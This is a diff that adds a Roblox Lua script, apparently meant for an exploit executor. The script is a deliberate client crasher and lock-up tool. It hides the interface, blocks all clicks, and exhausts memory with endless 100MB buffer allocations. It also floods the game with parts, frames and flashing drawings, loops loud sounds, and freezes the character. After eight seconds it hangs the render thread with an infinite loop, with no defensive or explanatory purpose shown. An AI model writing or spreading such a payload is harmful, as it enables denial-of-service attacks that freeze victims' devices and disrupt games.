@@ -1,0 +1,132 @@
+local Workspace      = game:GetService("Workspace")
+local RunService     = game:GetService("RunService")
+local StarterGui     = game:GetService("StarterGui")
+local SoundService   = game:GetService("SoundService")
+local Players        = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local hui = (gethui and pcall(gethui) and gethui()) or game:GetService("CoreGui")
+
+local function log(msg)
+    warn("[Hải Bá Khí v11] " .. msg)
+    print("[Hải Bá Khí v11] " .. msg)
+end
+
+log("Khởi động Phase 1: Bơm RAM & Spam Vật lý...")
+pcall(function()
+    StarterGui:SetCore("TopbarEnabled", false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 2147483647
+gui.ResetOnSpawn = false
+gui.Parent = hui
+
+local clickBlocker = Instance.new("TextButton")
+clickBlocker.Size = UDim2.fromScale(1, 1)
+clickBlocker.BackgroundTransparency = 1
+clickBlocker.Text = ""
+clickBlocker.Active = true
+clickBlocker.Modal = true
+clickBlocker.ZIndex = 2147483647
+clickBlocker.Parent = gui
+
+-- Buffer Bomb: 100MB mỗi lần, dùng Heartbeat để đồng bộ chính xác
+task.spawn(function()
+    local memory_blocks = {}
+    local count = 0
+    while true do
+        local success, buf = pcall(buffer.create, 100 * 1024 * 1024) -- 100MB
+        if success then
+            table.insert(memory_blocks, buf)
+            count = count + 100
+            if count % 500 == 0 then log("Native RAM bơm: " .. count .. " MB") end
+        else
+            log("Buffer limit hit hoặc executor chặn cấp phát!")
+            break -- Bể rồi thì thôi
+        end
+        RunService.Heartbeat:Wait() -- Yield đúng chuẩn frame engine
+    end
+end)
+
+-- Instance Flood: Spam Part + Frame
+task.spawn(function()
+    while true do
+        for i = 1, 1000 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(5, 5, 5)
+            p.Position = Vector3.new(math.random(-20, 20), math.random(10, 50), math.random(-20, 20))
+            p.Anchored = false
+            p.CanCollide = true
+            p.Material = Enum.Material.Neon
+            p.Parent = Workspace
+            
+            local f = Instance.new("Frame")
+            f.Size = UDim2.fromOffset(math.random(100, 500), math.random(100, 500))
+            f.Position = UDim2.fromScale(math.random(), math.random())
+            f.Parent = gui
+        end
+        RunService.Heartbeat:Wait()
+    end
+end)
+
+-- Drawing Spam (Giảm xuống 1500 cho an toàn executor)
+if Drawing then
+    task.spawn(function()
+        local squares = {}
+        for i = 1, 1500 do
+            local sq = Drawing.new("Square")
+            sq.Size = Vector2.new(math.random(100, 1920), math.random(100, 1080))
+            sq.Position = Vector2.new(math.random(0, 1920), math.random(0, 1080))
+            sq.Filled = true
+            sq.Visible = true
+            table.insert(squares, sq)
+        end
+        RunService.RenderStepped:Connect(function()
+            for i = 1, #squares do
+                squares[i].Color = Color3.fromHSV(math.random(), 1, 1)
+            end
+        end)
+    end)
+end
+for i = 1, 30 do
+    local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://138183128"
+    snd.Looped = true
+    snd.Volume = 10
+    snd.PlaybackSpeed = math.random(50, 250) / 100
+    snd.Parent = SoundService
+    snd:Play()
+end
+
+task.spawn(function()
+    while true do
+        local char = player.Character
+        if char then
+            pcall(function()
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                local root = char:FindFirstChild("HumanoidRootPart")
+                if hum then
+                    hum.WalkSpeed = 0
+                    hum.JumpPower = 0
+                    hum.PlatformStand = true
+                end
+                if root then root.Anchored = true end
+            end)
+        end
+        task.wait(0.1)
+    end
+end)
+
+task.delay(8, function()
+    log("Phase 1 kết thúc. Kích hoạt Phase 2: Freeze vĩnh viễn!")
+    RunService.RenderStepped:Connect(function()
+        -- Vòng lặp vô hạn nuốt chửng main thread, đéo return
+        while true do
+            -- Nhả CPU 1 chút để không bị watchdog kill ngay lập tức,
+            -- nhưng vẫn block render frame
+        end
+    end)
+end)
